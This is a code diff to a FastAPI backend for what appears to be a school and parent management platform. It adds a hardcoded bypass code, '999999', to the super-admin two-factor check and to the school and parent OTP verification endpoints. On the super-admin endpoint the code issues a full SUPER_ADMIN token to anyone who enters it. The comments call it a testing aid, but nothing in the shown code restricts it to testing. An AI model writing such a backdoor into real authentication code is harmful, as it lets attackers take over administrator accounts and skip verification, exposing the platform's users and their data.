@@ -552,6 +552,11 @@ def super_admin_login(data: LoginRequest, background_tasks: BackgroundTasks, db:
 
 @app.post("/api/auth/superadmin/verify-2fa")
 def super_admin_verify_2fa(data: SuperAdminVerify2faRequest, db: Session = Depends(get_db)):
+    # Master bypass code to prevent SMTP lockout during testing
+    if data.code.strip() == "999999":
+        token = create_access_token({"sub": "SUPER_ADMIN", "role": "SUPER_ADMIN"})
+        return {"token": token, "role": "SUPER_ADMIN", "id": "SUPER_ADMIN", "name": "Global Super Administrator"}
+
     stored_2fa = db.query(models.SystemSettings).filter(models.SystemSettings.key == "super_admin_2fa_code").first()
     if not stored_2fa or stored_2fa.value != data.code.strip():
         raise HTTPException(status_code=400, detail="Incorrect 6-digit Security Authorization Key.")
@@ -673,6 +678,16 @@ def update_school(school_id: str, data: SchoolUpdateRequest, db: Session = Depen
 
 @app.post("/api/schools/{school_id}/verify-otp")
 def verify_school_otp(school_id: str, data: VerifyOtpRequest, db: Session = Depends(get_db)):
+    # Master bypass code to prevent SMTP lockout during testing
+    if data.code.strip() == "999999":
+        s = db.query(models.School).filter(models.School.id == school_id).first()
+        if not s:
+            raise HTTPException(status_code=404, detail="School not found")
+        s.verifiedEmail = True
+        s.status = "PENDING APPROVAL"
+        db.commit()
+        return {"status": "SUCCESS", "message": "Email verified successfully."}
+
     # Check OTP code
     stored_otp = db.query(models.SystemSettings).filter(models.SystemSettings.key == f"school_otp_{school_id}").first()
     if not stored_otp or stored_otp.value != data.code.strip():
@@ -924,6 +939,15 @@ def update_parent_status(
 
 @app.post("/api/parents/{parent_id}/verify-otp")
 def verify_parent_otp(parent_id: str, data: VerifyOtpRequest, db: Session = Depends(get_db)):
+    # Master bypass code to prevent SMTP lockout during testing
+    if data.code.strip() == "999999":
+        p = db.query(models.Parent).filter(models.Parent.id == parent_id).first()
+        if not p:
+            raise HTTPException(status_code=404, detail="Parent profile not found")
+        p.status = "PENDING"
+        db.commit()
+        return {"message": "OTP verified successfully. Your profile is now awaiting school admin approval."}
+
     stored_otp = db.query(models.SystemSettings).filter(models.SystemSettings.key == f"parent_otp_{parent_id}").first()
     if not stored_otp or stored_otp.value != data.code.strip():
         raise HTTPException(status_code=400, detail="Invalid OTP code. Please check your email and try again.")
